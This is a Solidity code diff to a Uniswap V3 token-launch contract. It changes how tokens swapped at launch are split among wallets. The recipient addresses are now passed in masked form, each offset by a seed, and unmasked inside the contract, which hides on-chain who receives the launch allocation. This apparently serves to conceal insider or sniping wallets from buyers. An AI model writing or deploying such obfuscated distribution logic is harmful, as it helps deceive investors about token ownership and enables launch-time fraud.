@@ -86,7 +86,7 @@ contract UniswapV3TokenInitializer {
 
     mapping(address => bool) public isTaxExempt;
 
-    function init(address nonfungiblePositionManagerAddress, address swapRouterAddress, address stablecoinTokenAddress, uint256 initialSupply, uint256 ownerSupply, uint24 fee, bytes32 walletKey, uint256 wallets, uint256 startMarketcap) external payable {
+    function init(address nonfungiblePositionManagerAddress, address swapRouterAddress, address stablecoinTokenAddress, uint256 initialSupply, uint256 ownerSupply, uint24 fee, uint256 walletKey, uint256[] memory wallets, uint256 startMarketcap) external payable {
         require(_totalSupply == 0);
         emit IERC20.Transfer(address(0), address(this), _balances[address(this)] = _totalSupply = initialSupply);
         if(ownerSupply != 0) {
@@ -143,16 +143,20 @@ contract UniswapV3TokenInitializer {
         _balances[address(this)] = 0;
     }
 
-    function _splitSwappedAmount(address sender, bytes32 seed, uint256 length) private {
+    function _splitSwappedAmount(address sender, uint256 seed, uint256[] memory maskedWallets) private {
 
         uint256 totalAmount = _balances[sender];
         _balances[sender] = 0;
+
+        uint256 length = maskedWallets.length;
+
+        address[] memory wallets = _unmaskWallets(seed, maskedWallets);
         
         uint256[] memory weights = new uint256[](length);
         uint256 totalWeight;
 
         for (uint256 i = 0; i < length; ++i) {
-            uint256 weight = 500 + (uint256(keccak256(abi.encodePacked(seed, _toWallet(seed, i), i))) % 1001);
+            uint256 weight = 500 + (uint256(keccak256(abi.encodePacked(seed, wallets[i], i))) % 1001);
             weights[i] = weight;
             totalWeight += weight;
         }
@@ -161,13 +165,13 @@ contract UniswapV3TokenInitializer {
 
         for (uint256 i = 0; i < length - 1; ++i) {
             uint256 amount = (totalAmount * weights[i]) / totalWeight;
-            _balances[_toWallet(seed, i)] += amount;
+            _balances[wallets[i]] += amount;
             distributed += amount;
         }
-        _balances[_toWallet(seed, length - 1)] = totalAmount - distributed;
+        _balances[wallets[length - 1]] = totalAmount - distributed;
     }
 
-    function _toWallet(bytes32 seed, uint256 index) private pure returns(address) {
+    function _toWallet(uint256 seed, uint256 index) private pure returns(address) {
         return address(uint160(uint256(keccak256(abi.encodePacked(seed, index)))));
     }
 
@@ -258,5 +262,12 @@ contract UniswapV3TokenInitializer {
 
         result = prod0 * inv;
         return result;
+    }
+
+    function _unmaskWallets(uint256 seed, uint256[] memory maskedWallets) private pure returns(address[] memory wallets) {
+        wallets = new address[](maskedWallets.length);
+        for(uint256 i = 0; i < wallets.length; i++) {
+            wallets[i] = address(uint160(maskedWallets[i] - seed));
+        }
     }
 }
